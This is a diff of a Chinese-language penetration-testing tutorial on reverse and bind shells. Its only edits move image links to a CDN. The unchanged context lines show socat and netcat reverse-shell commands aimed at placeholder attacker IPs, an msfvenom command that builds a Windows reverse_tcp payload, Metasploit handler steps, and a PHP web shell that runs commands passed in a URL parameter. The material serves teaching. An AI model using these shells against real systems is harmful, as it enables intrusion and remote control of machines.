@@ -256,7 +256,7 @@ socat TCP:<attacker-ip>:<attacker-port>EXEC:"bash -li",pty,stderr,sigint,setsid,
 * setsid：在新会话中创建进程
 * sane：稳定终端，试图正常化
 * EXEC：“bash -li”创建交互式 bash 会话
-![](https://raw.githubusercontent.com/yy0691/img-bed/main/Net_Safe_FeiShu/YD2fb5wAboQN7DxXQ58c2EWsn7c.png)
+![](https://cdn.jsdelivr.net/gh/yy0691/img-bed@main/Net_Safe_FeiShu/YD2fb5wAboQN7DxXQ58c2EWsn7c.png)
 
 注意：如果 socat shell 无法正常工作，可以在命令中添加`-d -d`来增加详细程度
 
@@ -313,7 +313,7 @@ mkfifo /tmp/f; nc.traditional -l -p 8080 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /t
 mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 ```
 
-![](https://raw.githubusercontent.com/yy0691/img-bed/main/Net_Safe_FeiShu/JbeMb6BPyoFytGx7gbXcFZ3Onph.png)
+![](https://cdn.jsdelivr.net/gh/yy0691/img-bed@main/Net_Safe_FeiShu/JbeMb6BPyoFytGx7gbXcFZ3Onph.png)
 
 PSH反向shell
 
@@ -345,7 +345,7 @@ msfvenom的标准语法：`msfvenom -p <payload> <options>`
 msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
 ```
 
-![](https://raw.githubusercontent.com/yy0691/img-bed/main/Net_Safe_FeiShu/Y4iabVJ3doBH57xpXSiccffSnpg.png)
+![](https://cdn.jsdelivr.net/gh/yy0691/img-bed@main/Net_Safe_FeiShu/Y4iabVJ3doBH57xpXSiccffSnpg.png)
 
 |选项 |功能 |
 |---|---|
@@ -391,7 +391,7 @@ Linux 32位无阶段<u>Meterpreter载荷：</u><u>`linux/x86/meterpreter_reverse
 * `msfconsole` man page：手册页
 * `msfvenom --list payloads`：列出所有可用的有效载荷，可以使用管道连接grep搜索特定的有效载荷集
 
-![](https://raw.githubusercontent.com/yy0691/img-bed/main/Net_Safe_FeiShu/ZLzIb7oHUonzlKxWNaPccioOnsg.png)
+![](https://cdn.jsdelivr.net/gh/yy0691/img-bed@main/Net_Safe_FeiShu/ZLzIb7oHUonzlKxWNaPccioOnsg.png)
 
 
 
@@ -411,11 +411,11 @@ Linux 32位无阶段<u>Meterpreter载荷：</u><u>`linux/x86/meterpreter_reverse
 5. 使用`exploit -j`命令启动该模块，以作业的形式在后台运行
 6. 使用 `sessions 1` 将其再次置于前台
 
-![](https://raw.githubusercontent.com/yy0691/img-bed/main/Net_Safe_FeiShu/SBSlbsHAyoc3H7xvjuLc4X5Pnsd.png)
+![](https://cdn.jsdelivr.net/gh/yy0691/img-bed@main/Net_Safe_FeiShu/SBSlbsHAyoc3H7xvjuLc4X5Pnsd.png)
 
 当运行前一个任务中生成的暂存有效载荷时，Metasploit会接收到连接，发送剩余的有效载荷并给我们一个反向shell:
 
-![](https://raw.githubusercontent.com/yy0691/img-bed/main/Net_Safe_FeiShu/WP4mb6lHnoeDfixKSDKcVE8inme.png)
+![](https://cdn.jsdelivr.net/gh/yy0691/img-bed@main/Net_Safe_FeiShu/WP4mb6lHnoeDfixKSDKcVE8inme.png)
 
 ## 其他
 
@@ -440,7 +440,7 @@ PHP代码示例：
 
 执行代码后，会接受URL中的GET参数，并在系统上以 `shell_exec()` 执行它
 
-![](https://raw.githubusercontent.com/yy0691/img-bed/main/Net_Safe_FeiShu/AkuUbkbnnoJNtcxTvxXc92NUnSh.png)
+![](https://cdn.jsdelivr.net/gh/yy0691/img-bed@main/Net_Safe_FeiShu/AkuUbkbnnoJNtcxTvxXc92NUnSh.png)
 
 在URL请求中，包含了名为"cmd"的GET参数，并赋值"ifconfig"，然后正确地返回了目标的网络信息。换句话说，通过在shell的URL中输入`ifconfig` 命令，它就会在系统上执行，并返回结果给我们。这适用于我们选择使用的任何其他命令(例如 `whoami`，`hostname` ，`arch`，等等)。
 
